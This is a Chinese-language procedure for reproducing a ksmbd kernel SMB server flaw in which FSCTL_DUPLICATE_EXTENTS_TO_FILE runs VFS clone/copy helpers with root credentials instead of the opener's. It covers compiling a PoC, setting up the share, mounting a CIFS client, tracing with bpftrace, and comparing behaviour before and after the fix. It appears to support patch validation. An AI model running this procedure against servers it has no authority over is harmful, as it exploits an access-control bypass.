# 操作手册

以下步骤用于本机或隔离测试机验证，不要对未授权服务器执行。

## 1. 编译 PoC

在 `patch-08/` 目录内执行：

```sh
gcc -O2 -Wall -Wextra -o ksmbd_dup_extents_poc ksmbd_dup_extents_poc.c
```

## 2. 准备 ksmbd 服务端

要求：

- 服务端运行包含当前源码的 ksmbd。
- ksmbd share 可写。
- backing filesystem 支持 clone/reflink 更容易命中 `vfs_clone_file_range()`，例如 btrfs 或 xfs reflink。否则可能进入 fallback 或返回 `EOPNOTSUPP`。
- SMB 用户映射到一个非 root 本地 Unix 用户，例如 `pocuser`，这样观察 `uid=0` 与 opener uid 的差异更明显。

示例 share：

```ini
[poc]
	path = /srv/ksmbd-poc
	read only = no
	force create mode = 0600
	force directory mode = 0700
```

重启 ksmbd 后确认 `/srv/ksmbd-poc` 对 `pocuser` 可读写。

## 3. 挂载 CIFS 客户端

在客户端执行：

```sh
sudo mkdir -p /mnt/ksmbd-poc
sudo mount -t cifs //127.0.0.1/poc /mnt/ksmbd-poc \
  -o vers=3.1.1,username=pocuser,password='<password>',noperm
```

`noperm` 用于避免客户端本地权限检查干扰服务端验证。

准备测试文件：

```sh
python3 - <<'PY'
from pathlib import Path
p = Path('/mnt/ksmbd-poc')
(p / 'src.bin').write_bytes((b'KSMD-DUP-EXTENTS-POC\n' * 256)[:4096])
(p / 'dst.bin').write_bytes(b'\x00' * 4096)
PY
```

## 4. 观察服务端 VFS helper 凭据

在 ksmbd 服务端另开终端：

```sh
sudo bpftrace trace_ksmbd_dup_extents.bt
```

如果函数名因内核配置不可 kprobe，先确认符号：

```sh
sudo grep -E ' vfs_(clone|copy)_file_range$' /proc/kallsyms
```

## 5. 触发 FSCTL_DUPLICATE_EXTENTS_TO_FILE

在 CIFS 客户端运行：

```sh
./ksmbd_dup_extents_poc /mnt/ksmbd-poc/src.bin /mnt/ksmbd-poc/dst.bin 4096
cmp /mnt/ksmbd-poc/src.bin /mnt/ksmbd-poc/dst.bin && echo copied
```

预期：

- PoC 输出 `FICLONERANGE completed`，或在不支持 clone/reflink 的环境中输出 `EOPNOTSUPP`。
- 服务端 bpftrace 输出会出现 `kprobe:vfs_clone_file_range`；fallback 情况下也可能出现 `kprobe:vfs_copy_file_range`。
- 漏洞存在时，输出通常显示 `comm` 为 ksmbd worker 且 `uid=0 gid=0`，而不是 SMB 用户映射到的非 root Unix uid。

示例漏洞输出：

```text
kprobe:vfs_clone_file_range comm=ksmbd:io pid=1234 uid=0 gid=0
```

修复后预期：

- 若修复把 VFS helper 包在 opener credentials 下，同一观察点应显示 SMB opener 的 Unix uid。
- 若再叠加 SELinux/AppArmor/eBPF-LSM 策略拒绝 opener 对源/目标范围的 read/write，修复后 PoC 应返回 `EACCES`；漏洞版本可能因为 worker/root credential 而继续成功。

## 6. 可选 pause 模式

需要在打开 SMB 句柄后、发 ioctl 前调整服务端 LSM 策略或观察状态时：

```sh
./ksmbd_dup_extents_poc --pause /mnt/ksmbd-poc/src.bin /mnt/ksmbd-poc/dst.bin 4096
```

程序会在两个文件都打开后等待回车，再发送 `FICLONERANGE`。
